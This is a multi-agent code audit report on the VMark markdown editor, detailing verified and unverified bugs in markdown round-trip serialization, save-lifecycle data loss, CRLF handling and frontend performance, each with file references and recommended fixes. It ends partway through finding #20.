# VMark improvement audit — 2026-06-12

Multi-agent audit of the VMark codebase (~372k LOC). 135 agents: 8 subsystem
mappers, 9 of 12 dimension finders (see Coverage), then independent spot
verification of the top findings in the orchestrating session.

## Coverage and confidence — read this first

- **86 findings** across 9 dimensions: editor correctness, state/lifecycle
  correctness, frontend performance, Rust performance, security, MCP/AI,
  architecture, code health, testing.
- **Three dimensions did NOT run** (provider rate limit / transient socket
  error): **UX/a11y/i18n**, **build/DX/CI**, **dependency hygiene**. Treat
  their absence as "not audited", not "clean".
- The adversarial verification fleet was also rate-limited. Instead, the
  five highest-impact findings (#0, #1, #9, #11, #37) were **independently
  re-verified by direct code reading** and all five held. Findings marked
  *finder-evidence* below carry the finder’s own file:line evidence (several
  finders executed the real markdown pipeline to prove corruption) but have
  not been adversarially cross-checked — re-verify before large investments.
- Severity: P0 = corrupts/loses user data today; P1 = high-value; P2 =
  moderate; P3 = polish. Effort is AI-execution time: S = one focused agent
  session, M = multi-file change, L = architectural.

| Severity | Count |
|---|---|
| P0 | 3 |
| P1 | 24 |
| P2 | 39 |
| P3 | 20 |

## Top priorities

The findings that corrupt or lose user data, ordered by blast radius. All
seven below are in the default configuration — no opt-in feature required
(except #37, which requires running a workflow on an untrusted workspace).

| # | Sev | Finding | Status |
|---|---|---|---|
| 0 | P0 | Serializer strips user-authored backslash escapes, turning literal text into live markup on every WYSIWYG round-trip | **verified** |
| 1 | P0 | Escape-stripping corrupts LaTeX inside math: $a\!b$, $x\_i$, $$\$5$$ lose their backslashes on every WYSIWYG serialize | **verified** |
| 9 | P0 | Tab-switch during WYSIWYG debounce window writes the old tab's content into the newly active tab (cross-tab corruption, auto-saved to the wrong file) | **verified** |
| 10 | P1 | Window close / quit / tab close decide 'not dirty' without flushing pending WYSIWYG edits — silent keystroke loss with no prompt | finder-evidence |
| 11 | P1 | CRLF files never leave the dirty state after save — markSaved compares LF in-memory content against CRLF-normalized disk output, causing an endless auto-save rewrite loop | **verified** |
| 12 | P1 | External-change auto-reload discards unflushed WYSIWYG keystrokes — fs:changed handler reads isDirty without flushing the active editor | finder-evidence |
| 37 | P1 | Workflow sandbox escapes via a symlinked directory when the write target does not yet exist | **verified** |

Root-cause patterns worth fixing once, centrally:

1. **The serializer’s post-processing passes don’t know about math (or each
   other’s protected ranges).** #0, #1, #2, #6 all reduce to "a regex pass
   runs outside an incomplete protected-range scanner". One shared scanner
   that masks fenced code, inline code, `$...$` / `$$...$$` math, and
   frontmatter — used by escape-stripping, hard-break normalization, and
   detection — fixes four findings.
2. **Lifecycle sites read dirty state without flushing the WYSIWYG debounce
   buffer.** #9, #10, #12, #14 (and #13’s sibling). A single rule — every
   consumer of `isDirty`/content must `flushActiveWysiwygNow()` first, and
   the unmount flush must pin its mount-time tabId — closes the class.
3. **The MCP bridge bypasses canonical services.** #57 (three hand-rolled
   save paths), #45 (read-only guard on the wrong tab), #48 (window
   addressing). Routing MCP handlers through the same services the UI uses
   removes a whole category of drift.

## Duplicate clusters

Different dimensions independently flagged the same root cause — a useful
confidence signal. Merged for counting purposes:

- #40, #51 — MCP bridge auth token from SipHash/RandomState instead of a CSPRNG
- #53, #68, #78 — vmark-mcp-server tests/lint never run in CI (78 adds: tools/*.ts and cli.ts have zero tests)
- #58, #77 — serializer silently drops unknown ProseMirror nodes; no schema-completeness gate
- #55, #60, #69, #80 — MCP wire contract string-tripled across sidecar TS / frontend TS / Rust, with ~22-25 dead legacy operation strings and no parity test
- #61, #72 — ADR-013 "utils must be leaf-pure" unenforced on the Tauri/services axis (14-16 violating files)

## Markdown round-trip integrity (editor correctness)

Silent content corruption through the WYSIWYG serialize/parse cycle. These compound: every save or mode-switch applies the damage again.

### #0 · P0/M · Serializer strips user-authored backslash escapes, turning literal text into live markup on every WYSIWYG round-trip

**Status:** independently verified (code re-read in orchestrating session)

**Files:**
- `src/utils/markdownPipeline/serializer.ts:154`
- `src/utils/markdownPipeline/serializer.ts:232`
- `src/utils/markdownPipeline/serializer.test.ts:241`

**Evidence:** stripUnnecessaryEscapes (serializer.ts:232-248) removes every \[ \] \$ \` \_ \* \! \( \) escape outside code ranges, preserving only block-start chars at line start. The escapes are NOT redundant for paired delimiters: I ran the project pipeline (parseMarkdown/serializeMarkdown from adapter.ts with testSchema) and confirmed: source text 'literal \*not italic\* and \[not a link\](x) and \$5-\$10' serializes after one WYSIWYG visit to 'literal *not italic* and [not a link](x) and $5-$10', and re-parsing that yields italic, link, and math_inline nodes — the user's literal text became markup. Same for WYSIWYG plain text '2*3*4' → reparsed as text,emphasis,text; '$5-$10' → text,inlineMath,text; '_snake_' → emphasis; '`backtick`' → inlineCode. serializer.test.ts (lines 241-310) only tests LONE special chars ('Use * star'), never paired delimiters, so the corruption is uncovered. This destroys user data silently on every save/mode-switch and compounds.

**Recommendation:** Make the strip pass safe: after stripping a candidate escape, only accept the strip if re-parsing the affected paragraph yields the identical text node (or, cheaper, keep the escape whenever the same delimiter char occurs again later in the same line, and always keep \$ when another $ exists on the line). Add round-trip tests for paired delimiters: \*x\*, \_x\_, \`x\`, \[x\](y), \$5-\$10. The lone-char readability goal can be preserved; the current regex-only policy cannot.

### #1 · P0/S · Escape-stripping corrupts LaTeX inside math: $a\!b$, $x\_i$, $$\$5$$ lose their backslashes on every WYSIWYG serialize

**Status:** independently verified (code re-read in orchestrating session)

**Files:**
- `src/utils/markdownPipeline/serializer.ts:164`
- `src/utils/markdownPipeline/serializer.ts:236`

**Evidence:** buildCodeRanges (serializer.ts:164-193) protects only backtick fences and inline code spans — not $...$ / $$...$$ math. Verified through the live pipeline: 'value $a\\!b$ and $x\\_i$ end' serializes to 'value $a!b$ and $x_i$ end' (negative thin-space deleted; literal underscore becomes a subscript); display math '$$\n\\$5 + \\$10\n$$' becomes '$$\n$5 + $10\n$$' (escaped dollars now break KaTeX); 'f\\!(x)' in a $$ block becomes 'f!(x)'. Any keystroke in WYSIWYG triggers serialization (TiptapEditor.tsx flushToStore), so merely editing prose in a document containing such math silently rewrites the math.

**Recommendation:** Add math spans to the protected ranges in buildCodeRanges: a regex for $$...$$ blocks plus the same inline-math delimiter rules the parser uses ((?<!\$)\$(?!\$)[^$\n]+\$(?!\$)). This is a localized change in serializer.ts with golden tests for \!, \_, \$, \(, \[ inside inline and display math.

### #2 · P1/M · Hard-break normalization rewrites LaTeX \\ row separators inside $$ display math (save path and serializer both affected)

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/utils/linebreaks.ts:92`
- `src/services/persistence/saveToPath.ts:84`
- `src/utils/markdownPipeline/serializer.ts:277`
- `src/utils/linebreakDetection.ts:79`

**Evidence:** normalizeHardBreaks (linebreaks.ts:92-97) converts any non-fence line ending in '\' to two trailing spaces, skipping only backtick/tilde fences — not $$ blocks. Verified: normalizeHardBreaks('$$\n\\begin{aligned}\na &= b \\\\\nc &= d\n\\end{aligned}\n$$', 'twoSpaces') returns 'a &= b \\  ' — one backslash of the LaTeX row separator eaten, breaking the aligned environment. saveToPath.ts:84-89 runs this on every save. The serializer's twoSpaces pass (serializer.ts:277-281, replaceOutsideCode) has the identical hole, verified through the full pipeline. Trigger conditions: hardBreakStyleOnSave='twoSpaces', OR default 'preserve' with docStyle 'mixed'/'unknown' (resolveHardBreakStyle defaults to twoSpaces, linebreaks.ts:40-41) — e.g. a doc containing aligned math plus one two-space hard break detects as 'mixed' and corrupts on save with default settings. Bonus defect: detectHardBreakStyle (linebreakDetection.ts:79-83) counts the LaTeX \\ lines themselves as backslash hard breaks, skewing detection.

**Recommendation:** Extract one shared scanner that skips fenced code AND $$ math blocks (and frontmatter), and use it in normalizeHardBreaks, detectHardBreakStyle, and the serializer's hard-break pass. Add tests with aligned/cases environments under both target styles.

### #3 · P1/S · Link titles are silently dropped: [text](url "title") loses its title after any WYSIWYG visit

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/utils/markdownPipeline/mdastInlineConverters.ts:124`
- `src/utils/markdownPipeline/pmInlineConverters.ts:97`
- `src/services/assembly/tiptapExtensions.ts:142`

**Evidence:** convertLink (mdastInlineConverters.ts:124-138) creates the link mark with only { href } — node.title is discarded; wrapWithMark's link case (pmInlineConverters.ts:97-104) emits only url+children. The Link extension (tiptapExtensions.ts:142-151) is stock @tiptap/extension-link, which has no title attribute. Verified through the pipeline: '[text](https://example.com "My Title")' round-trips to '[text](https://example.com)'. Image titles survive (image node has a title attr), making the asymmetry an oversight rather than policy.

**Recommendation:** Extend the Link mark with a title attribute (addAttributes), pass node.title through convertLink, and emit mark.attrs.title in wrapWithMark. Three small symmetric edits plus a round-trip test beside the converters.

### #4 · P2/M · Paragraph breaks and hard breaks inside table cells collapse to a single space on round-trip

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/utils/markdownPipeline/pmBlockConverters.ts:252`
- `src/utils/markdownPipeline/mdastBlockConverters.ts:247`

**Evidence:** convertTableCellContent (pmBlockConverters.ts:252-265) joins multiple cell paragraphs with mdast {type:'break'} nodes, but remark-gfm serializes a break inside a table cell as a plain space. Verified: a PM table cell with paragraphs 'para one'/'para two' serializes to '| para one para two |' and reparses as one paragraph — the user's Enter (or Shift+Enter hardBreak, which takes the same path via convertInlineContent) inside a WYSIWYG table cell is silently destroyed on save/mode-switch. The real schema's TableCell (content 'block+', @tiptap/extension-table via alignedTableNodes.ts) permits multi-paragraph cells, so this is reachable by normal editing. Parse side (mdastBlockConverters.ts:247-249) flattens every cell into a single paragraph, so the loss is invisible until saved.

**Recommendation:** Serialize break-in-cell as inline HTML '<br>' (the GFM-canonical encoding) and, in convertTable's cell handling, convert html '<br>' nodes back to hardBreak. Add a cell round-trip test with Shift+Enter and multi-paragraph content.

### #5 · P2/S · CJK formatter silently no-ops on any document containing --- / *** / ___ inside a fenced code block

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/lib/cjkFormatter/markdownParser.ts:76`
- `src/lib/cjkFormatter/markdownParser.ts:299`
- `src/lib/cjkFormatter/markdownParser.ts:313`

**Evidence:** findProtectedRegions scans thematic breaks (step 1b, line 76) BEFORE fenced code (step 2, line 91), and isInsideRegion (line 299) checks only the match start, so a '---' line inside a code fence creates a thematic_break region nested inside the later fence region. extractFormattableSegments (lines 313-341) then moves currentPos BACKWARD (currentPos = contained region's smaller end), emitting a 'formattable' segment that overlaps the protected fence; reconstructText duplicates that text. Verified live: formatMarkdown on a doc with '---' inside ``` produced '[CJK Formatter] Integrity check failed, returning original text' with fence count 2→3 — the integrity backstop (integrity.ts) catches the corruption but the formatter returns the input unchanged, so 'Format document' silently does nothing for the entire file (console-only warning). '---' inside code fences is common (YAML doc separators, diff/SQL snippets, frontmatter examples).

**Recommendation:** Scan fenced code blocks before thematic breaks, and harden the seams: make isInsideRegion reject any overlap (check both match start and end), and make extractFormattableSegments use currentPos = Math.max(currentPos, region.end). Add a regression test with '---' inside a fence asserting the prose around it still gets formatted.

### #6 · P2/S · remarkValidateMath accepts '$5-$10' as inline math — dollar amounts render as math in WYSIWYG

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/utils/markdownPipeline/parser/remarkPlugins.ts:36`

**Evidence:** remarkValidateMath only rejects inline math whose content has leading/trailing whitespace (remarkPlugins.ts:36). Verified through the pipeline: 'between $5-$10 range' parses to text,inlineMath,text — '5-' becomes math because the closing $ is preceded by '-'. Any price range, '$5–$8', '$10/$20' etc. typed in source mode renders as garbled math in WYSIWYG. Pandoc solved this with the rule 'closing $ must not be immediately followed by a digit', which would reject this exact shape.

**Recommendation:** Extend remarkValidateMath to also reject inline math whose closing delimiter is immediately followed by a digit (and optionally whose content starts with a digit and contains no math operators), mirroring Pandoc's heuristic. Pure-function change with table-driven tests.

### #7 · P2/S · Auto-pair selection wrap strips marks and deletes inline atoms (math, images) in the wrapped selection

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/plugins/autoPair/handlers.ts:115`

**Evidence:** handleTextInput's selection branch (handlers.ts:115-127) does state.doc.textBetween(from, to) and replaceWith(from, to, state.schema.text(open+text+close)). textBetween with no leafText flattens inline atoms to nothing — a selection containing a math_inline, inline image, or footnote_reference is replaced by plain text, deleting those nodes; and schema.text() carries no marks, so wrapping bolded/linked text in quotes or brackets silently strips the formatting. Typing a quote/paren over a formatted selection is a routine action; the loss is only recoverable via undo.

**Recommendation:** Instead of replaceWith over the whole range, insert the closing char at `to` then the opening char at `from` as two insertText steps (with mapped positions), leaving the selected content untouched; place the cursor after the original selection. Add tests wrapping a bold span and a selection containing math_inline.

### #8 · P3/M · Setext headings are intentionally disabled but the trade-off destroys H2 semantics without warning ('Title\n---' becomes paragraph + thematic break)

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/utils/markdownPipeline/parser/remarkPlugins.ts:73`
- `src/utils/markdownPipeline/parser/processorFactory.ts:50`

**Evidence:** remarkDisableSetextHeadings (remarkPlugins.ts:73-80) disables micromark's setextUnderline with a documented rationale (the '  -' empty-list misparse). Verified consequences: 'Setext heading\n===============' parses as ONE paragraph whose text includes the literal '===' line and serializes to 'Setext heading\n\\==============='; 'Setext h2\n---------' parses as paragraph + thematicBreak and serializes to 'Setext h2\n\n---' — opening and saving a setext-styled file permanently converts every H2 into body text plus a horizontal rule, silently changing document structure (outline, TOC, exports). The trade-off is documented in code but invisible to the user.

**Recommendation:** Keep setext parsing disabled, but add a one-time load check: if the raw file matches a setext-heading pattern (line + ===/--- underline outside code fences), show a toast offering to convert setext headings to ATX (a pure-string preprocessing pass), so structure is preserved instead of silently destroyed.

## Save lifecycle and data-loss windows (state correctness)

A recurring root cause: WYSIWYG keystrokes live only in the ProseMirror doc during the 100ms-5s adaptive debounce window, and several lifecycle sites read store state without flushing first. `useFileSave` shows the correct pattern (flushActiveWysiwygNow() before reading); the sites below missed it.

### #9 · P0/S · Tab-switch during WYSIWYG debounce window writes the old tab's content into the newly active tab (cross-tab corruption, auto-saved to the wrong file)

**Status:** independently verified (code re-read in orchestrating session)

**Files:**
- `src/components/Editor/TiptapEditor.tsx:475-510`
- `src/components/Editor/TiptapEditor.tsx:195-228`
- `src/hooks/useDocumentState.ts:86-110`
- `src/components/Editor/Editor.tsx:53-62`
- `src/components/StatusBar/StatusBar.tsx:176-181`

**Evidence:** TiptapEditorInner's unmount cleanup (the #755 keystroke-loss fix, TiptapEditor.tsx:482) calls `flushToStoreRef.current(editorRef.current)` when `pendingRaf` or `pendingDebounceTimeout` is set. `flushToStore` (line 195) serializes the dying editor's PM doc and calls `setContent(markdown)` obtained from `useDocumentActions()` (line 151). `useDocumentActions.setContent` resolves the tab AT CALL TIME via `useTabStore.getState().activeTabId[windowLabel]` (useDocumentState.ts:90-110). Editor.tsx keys the surface by tabId (line 57), so a tab switch remounts the editor; StatusBar.tsx:178 calls `setActiveTab` with no flush, so by the time React runs the old editor's cleanup, activeTabId already points at tab B. Result: tab A's serialized markdown is written into tab B's document (`useDocumentStore.setContent(B, A-markdown)`), marking B dirty; useAutoSave (enabled by default, settingsStore.ts:126) then writes A's content over B's file on disk. The debounce window is 300ms–5s for docs >20K chars (getAdaptiveDebounceDelay, TiptapEditor.tsx:99-106), so 'type, then Ctrl+Tab/click another tab' reproduces it. The same misdirection corrupts tab B when tab A is closed (closeTab switches active tab and cleanupTabState removes A's doc before the editor unmounts). Mode-switch flushes (modeSwitchCleanup.ts:29) are unaffected because the active tab doesn't change there.

**Recommendation:** Pin the target tab at mount: TiptapEditorInner already captures `activeTabId` (line 160) and remounts per tab; change `flushToStore` to call `useDocumentStore.getState().setContent(mountTabId, markdown)` (and resolve hardBreakStyle from `mountTabId`, not the live activeTabId at line 205) instead of routing through `useDocumentActions().setContent`. `updateDoc`'s missing-key guard makes the flush a safe no-op when the tab was closed. Add a regression test: type into tab A (mock pending debounce), switch active tab to B, unmount, assert B's document content unchanged and A's document received the flush.

### #10 · P1/M · Window close / quit / tab close decide 'not dirty' without flushing pending WYSIWYG edits — silent keystroke loss with no prompt

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/hooks/useWindowClose.ts:101-141`
- `src/hooks/useTabOperations.ts:159-193`
- `src/hooks/useReplaceableTab.ts:34-43`
- `src/hooks/useFileSave.ts:128`

**Evidence:** useWindowClose.handleCloseRequest filters dirty tabs from `useDocumentStore` (lines 102-105) and, when none are dirty, immediately does `removeDocument` for every tab, `removeWindow`, and `invoke("close_window")` (lines 134-138) — without calling `flushActiveWysiwygNow()`. Keystrokes inside the adaptive debounce window (up to 5s on large docs, TiptapEditor.tsx:99-106) exist only in the PM doc; the store still reports clean, so the window closes with no save prompt and the webview is destroyed before any unmount flush can matter (the dirty decision was already made). The same unflushed read happens in closeTabWithDirtyCheck (useTabOperations.ts:187 — `if (!doc.isDirty)` closes and runs `cleanupTabState(tabId)` which deletes the document) and getReplaceableTab (useReplaceableTab.ts:40 — a 'clean' untitled tab with in-flight keystrokes is replaced on file open). By contrast, handleSave/handleSaveAs/handleSaveAllQuit all call `flushActiveWysiwygNow()` first (useFileSave.ts:128, 241, 329), showing the established pattern these sites missed.

**Recommendation:** Call `flushActiveWysiwygNow()` at the top of useWindowClose.handleCloseRequest, at the top of closeTabWithDirtyCheck (before reading the document at line 159), and in getReplaceableTab before building tabsInfo. The flush is synchronous and cheap. Add tests asserting a pending-debounce document triggers the dirty prompt on window close and tab close.

### #11 · P1/M · CRLF files never leave the dirty state after save — markSaved compares LF in-memory content against CRLF-normalized disk output, causing an endless auto-save rewrite loop

**Status:** independently verified (code re-read in orchestrating session)

**Files:**
- `src/stores/documentStore/document.ts:160-172`
- `src/services/persistence/saveToPath.ts:83-93`
- `src/services/persistence/saveToPath.ts:138-141`
- `src/hooks/useAutoSave.ts:79-95`
- `src/stores/settingsStore.ts:126-134`

**Evidence:** Both editors normalize content to LF in memory: CodeMirror's `update.state.doc.toString()` (SourceEditor.tsx:151) and `serializeMarkdown` in flushToStore emit \n. saveToPath converts back on save: `normalizeLineEndings(content, targetLineEnding)` (saveToPath.ts:89) with default `lineEndingsOnSave: "preserve"` (settingsStore.ts:134), so a file detected as CRLF writes CRLF `output`. saveToPath then calls `markSaved(tabId, output)` (line 141), and `buildPostSaveState` computes `isDirty: doc.content !== diskContent` with a strict comparison (document.ts:169) — LF content vs CRLF output is always unequal, so isDirty stays true after every successful save. With `autoSaveEnabled: true` by default (settingsStore.ts:126), useAutoSave re-saves the identical bytes every interval forever (lines 84-95), churning mtime and creating a history snapshot per save; the dirty dot never clears and window close always prompts 'unsaved changes' even immediately after Cmd+S. The TOCTOU test at documentStore.test.ts:183 covers content divergence from user edits but no test covers normalization-only divergence. Same mechanism fires for hard-break normalization (saveToPath.ts:88) on docs with mixed break styles edited in source mode.

**Recommendation:** Make the post-save dirty comparison normalization-aware: pass the pre-normalization input alongside the disk output (e.g. `markSaved(tabId, { diskContent: output, inputContent: content })`) and compute `isDirty: doc.content !== inputContent`, keeping `lastDiskContent = output`; alternatively keep `savedContent` as the in-memory (LF) form and only `lastDiskContent` as the normalized form. Add a test: CRLF doc → edit → save → isDirty === false, and assert auto-save does not re-fire on unchanged content.

### #12 · P1/S · External-change auto-reload discards unflushed WYSIWYG keystrokes — fs:changed handler reads isDirty without flushing the active editor

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/hooks/useExternalFileChanges.ts:317-375`
- `src/hooks/useExternalFileChanges.ts:384-480`
- `src/components/Editor/TiptapEditor.tsx:99-106`

**Evidence:** useExternalFileChanges does not import wysiwygFlush at all (imports, lines 34-52). handleModifyEvent reads `doc.isDirty` from the store (line 319, 356-359) to choose between `auto_reload` and `prompt_user`. Keystrokes within the WYSIWYG debounce window (100ms–5s) are not yet in the store, so a document the user is actively typing in still reports clean; an external modification (git checkout, sync daemon) then takes the `auto_reload` branch (lines 361-366) and `loadContent` replaces the document — the external-sync effect in TiptapEditor pushes disk content into the PM doc via `setContentWithoutHistory`, destroying the unflushed keystrokes with no prompt and no undo entry for the replacement. The correct behavior (prompt because the doc was actually dirty) is one missed flush away. useAutoSave demonstrates the intended pattern: it calls `flushActiveWysiwygNow()` before reading dirty state (useAutoSave.ts:73).

**Recommendation:** Call `flushActiveWysiwygNow()` at the top of the `fs:changed` listener callback (before `getOpenFilePaths()` at line 392), so the store dirty state is accurate when policy is resolved. One line plus a test that a pending-debounce doc routes to `prompt_user` instead of `auto_reload`.

### #13 · P1/M · Hot-exit restore never re-checks the disk — a restored dirty doc whose file changed while the app was closed is silently overwritten by default-on auto-save

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/services/persistence/hotExit/restoreHelpers.ts:394-467`
- `src/hooks/useAutoSave.ts:84-87`
- `src-tauri/src/watcher.rs:126-174`

**Evidence:** restoreDocumentState performs zero file I/O — it rebuilds the document purely from the captured session: `loadContent(saved_content)`, `updateLastDiskContent(last_disk_content)` (lines 421-435), then `setContent(docState.content)` for dirty docs (line 439). Nothing compares the captured `last_disk_content` against what is actually on disk now. The notify-based watcher (watcher.rs) only emits events for changes occurring after `start_watching`, so a modification made while VMark was closed (git pull, another editor, sync daemon) is invisible. The restored doc is dirty but neither isMissing nor isDivergent, so useAutoSave (enabled by default) writes `doc.content` — based on the pre-shutdown disk state — over the externally updated file within the first auto-save interval, with no prompt and no toast. The external-change machinery (useExternalFileChanges) that would normally route this to the 3-option dialog never fires because no fs event exists.

**Recommendation:** After restoreDocumentState (or batched after restoreTabs), do a best-effort `readTextFile(file_path)` per restored doc with a file path and compare against the restored `lastDiskContent` with `softContentEquals`. On mismatch: update lastDiskContent and, if the doc is dirty, `markDivergent(tabId)` (which already blocks auto-save per useAutoSave.ts:84) and surface the existing fileChanged dialog; if clean, reload from disk. Add a test with a doctored session file plus a newer disk file.

### #14 · P2/S · Hot-exit capture responds with store state without flushing the WYSIWYG editor — up to 5s of typing lost across update-restart

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/services/persistence/resilience/_hotExitCapture.ts:225-268`
- `src/services/persistence/hotExit/restartWithHotExit.ts:67-90`
- `src/hooks/useUpdateChecker.ts:368`

**Evidence:** The CAPTURE_REQUEST listener in useHotExitCapture builds the session payload straight from `useDocumentStore`/`useTabStore` state (captureWindowState, lines 192-223) and never calls `flushActiveWysiwygNow()`. Keystrokes inside the adaptive debounce window (up to 5s on 1M-char docs) exist only in the PM doc, so the captured `content` is stale. restartWithHotExit (triggered by the in-app updater at useUpdateChecker.ts:368 and Settings → Advanced restart) relaunches immediately after capture, so those keystrokes are unrecoverable after restore. The 10s crash-recovery writer has the same staleness but is a periodic best-effort snapshot; the hot-exit capture is the authoritative pre-restart state and should be exact.

**Recommendation:** Call `flushActiveWysiwygNow()` as the first statement of the CAPTURE_REQUEST handler in _hotExitCapture.ts (before captureWindowState). The flusher is registered for the visible editor of the same window receiving the event, so this is one synchronous line. Add a test that a pending-debounce edit appears in the capture payload.

### #15 · P2/M · Crash-recovery tabs restore with savedContent/lastDiskContent = "" — auto-save silently overwrites the on-disk file and external-change detection is broken for recovered docs

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/services/persistence/resilience/_crashRecoveryStartup.ts:178-198`
- `src/stores/documentStore/document.ts:178-194`
- `src/hooks/useAutoSave.ts:84-87`

**Evidence:** restoreSnapshot calls `initDocument(tabId, snapshot.content, snapshot.filePath, "")` with an empty savedContent 'to make it dirty' (_crashRecoveryStartup.ts:192-197). initDocument then sets `lastDiskContent = savedContent` = "" (document.ts:187-189). Consequences: (1) the recovered doc has a real filePath, is dirty, and is neither missing nor divergent, so default-on auto-save writes the (possibly stale) snapshot over the disk file within one interval — without the user ever reviewing the recovered content against what is on disk (the disk may have advanced: the crash may predate edits made in another tool, or an earlier successful save). (2) lastDiskContent="" breaks the watcher's soft-equals echo suppression (useExternalFileChanges.ts:339) for this tab — every subsequent fs event on the file compares against "" and is treated as a real external change, firing the dirty-change dialog.

**Recommendation:** In restoreSnapshot, read the file from disk (best-effort) and use the disk content as savedContent/lastDiskContent so isDirty reflects a real difference and the echo guard works; if the snapshot differs from disk, also `markDivergent(tabId)` so auto-save stays paused until the user explicitly saves or reloads. If the disk read fails, keep the current behavior but `markMissing` so auto-save skips it.

### #16 · P3/S · Rust watcher's per-path debounce can break the frontend's (old,new) rename-pair invariant, leaving a tab pointed at a nonexistent path

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src-tauri/src/watcher.rs:142-158`
- `src/hooks/useExternalFileChanges.ts:394-427`

**Evidence:** useExternalFileChanges' rename branch assumes `paths` arrives as (old,new) pairs: `for (let i = 0; i + 1 < paths.length; i += 2)` (line 396). But handle_event in watcher.rs filters each path of an event independently through the 200ms per-(watch_id,path) debounce map (lines 142-158) before emitting. If a file was modified and then renamed within 200ms (common in editor save-then-rename and git operations), the old path's entry is still inside the debounce window and gets dropped from the rename event, leaving `paths = [newPath]`. The pair loop then never runs, and the fallback loop only inspects paths present in the event — the open tab keyed by oldPath is never visited, so the tab is neither re-pathed nor marked missing. The doc silently keeps a filePath that no longer exists; the next save recreates the old file alongside the renamed one.

**Recommendation:** In handle_event, exempt rename events from the per-path debounce filter (emit all of `event.paths` for `kind == "rename"`, or drop the whole event only if every path is debounced). The frontend pair loop plus existence-verifying fallback already handle duplicates safely. Add a Rust unit test for a rename event whose first path is inside the debounce window.

### #17 · P3/S · useWindowClose registers Tauri listeners in an un-cancelled async setup — StrictMode/dev mounts leak duplicate listeners and unmount-before-ready leaks all three

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/hooks/useWindowClose.ts:186-263`
- `src/hooks/useExternalFileChanges.ts:377-506`

**Evidence:** The effect fires `setup()` (async, awaits three `currentWindow.listen` calls, lines 198-253) and the cleanup only iterates whatever `unlisteners` contains at cleanup time (lines 260-262). There is no `cancelled` flag: if cleanup runs before `setup()` finishes (React StrictMode double-mount, or windowLabel change), listeners registered after cleanup are never unsubscribed — duplicate `menu:close` / `window:close-requested` / `app:quit-requested` handlers accumulate. The code itself acknowledges the symptom ('Guard against duplicate listeners (React Strict Mode creates two)', line 234) and papers over it with `isClosingRef` re-entry guards instead of fixing the leak. The sibling hook useExternalFileChanges (lines 377-505) shows the project's own correct pattern: a `cancelled` flag checked after each await, with immediate unlisten when cancelled.

**Recommendation:** Adopt the cancelled-flag pattern from useExternalFileChanges: set `let cancelled = false` in the effect, check it after each awaited `listen()` (unlistening immediately if true), and set it in cleanup before iterating `unlisteners`. Then the StrictMode comment and one layer of duplicate-handler guarding can eventually be retired.

## Frontend performance

Per-keystroke full-document work in source mode, unbounded caches, and ~40% of cold-start JS spent on statically-imported editor vendors.

### #18 · P1/M · Source mode flushes the full document to the store on every keystroke — no debounce, two extra full-doc materializations per edit

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/components/Editor/SourceEditor.tsx:149`
- `src/hooks/useSourceEditorSync.ts:94`
- `src/components/Editor/TiptapEditor.tsx:99`
- `src/services/navigation/largeFileRouting.ts:88`

**Evidence:** SourceEditor.tsx:149-152 — the CodeMirror updateListener runs `update.state.doc.toString()` and `setContentRef.current(newContent)` on EVERY `docChanged` update, with no debounce. The store write re-renders every content subscriber per keystroke, and the SourceEditor's own re-render triggers useSourceEditorSync.ts:94 (`view.state.doc.toString()` again for the echo-comparison fallback — the cheap short-circuit at line 86-91 can't hit after internal edits because `lastAppliedContentRef` is only updated by external syncs). So each keystroke materializes the full document string at least twice plus an O(n) string compare. Contrast TiptapEditor.tsx:99-106, where the WYSIWYG surface has an adaptive 100ms–5s debounce explicitly justified for large docs. Crucially, files >= 1 MB are auto-routed INTO source mode (fileSizeThresholds.ts SOURCE_MODE_DEFAULT_BYTES = 1 MB, largeFileRouting.ts:88 forceSourceMode), and up to 50 MB can be opened there — so the surface designated for large files is the one with per-keystroke O(n) cost. On a 10 MB file each keystroke allocates ~40 MB of transient UTF-16 strings.

**Recommendation:** Mirror the WYSIWYG pattern: apply getAdaptiveDebounceDelay-style debouncing to the source-mode setContent flush, and register a synchronous flusher (the registerActiveWysiwygFlusher pattern already exists in utils/wysiwygFlush.ts) so save, mode-switch, hot-exit, and crash-snapshot paths flush pending content before reading the store. Also set `lastAppliedContentRef`/`lastSyncedDocRef` inside the flush so useSourceEditorContentSync's cheap short-circuit hits after internal edits, eliminating the second toString per keystroke.

### #19 · P1/S · getCursorInfoFromCodeMirror materializes the whole document (toString + split) on every cursor move in source mode

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/utils/cursorSync/codemirror.ts:68`
- `src/components/Editor/SourceEditor.tsx:169`
- `src/utils/cursorSync/markdown.ts:161`

**Evidence:** cursorSync/codemirror.ts:68-69 — `const content = view.state.doc.toString(); const lines = content.split("\n");` runs inside getCursorInfoFromCodeMirror, which SourceEditor.tsx:169-171 calls on EVERY `update.selectionSet || update.docChanged`. That's a full rope flatten plus an array allocation of every line on every arrow-key press, mouse click, and keystroke. The `lines` array is then fed to findCodeFenceStartLine (markdown.ts:161-191), which only ever reads lines 0..lineIndex with a linear fence scan. On a forced-source 5 MB file, simply holding an arrow key performs repeated O(doc) allocations.

**Recommendation:** Drop the toString/split entirely: CodeMirror's `doc.lineAt`/`doc.line(n)`/`doc.iterLines` give O(log n) line access. Rewrite findCodeFenceStartLine/isInsideCodeBlock/getTableAnchorForLine to take the CM `Text` doc (or an iterator over lines up to lineIndex) instead of a pre-split string array. The fence scan stays O(lineIndex) line reads but stops allocating two full copies of the document per cursor move.

### #20 · P1/M · Source cursor-context detection runs unbounded and quadratic line scans on every selection change

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/plugins/sourceContextDetection/codeFenceDetection.ts:48`
- `src/plugins/sourceContextDetection/codeFenceDetection.ts:144`
- `src/plugins/sourceContextDetection/blockMathDetection.ts:36`
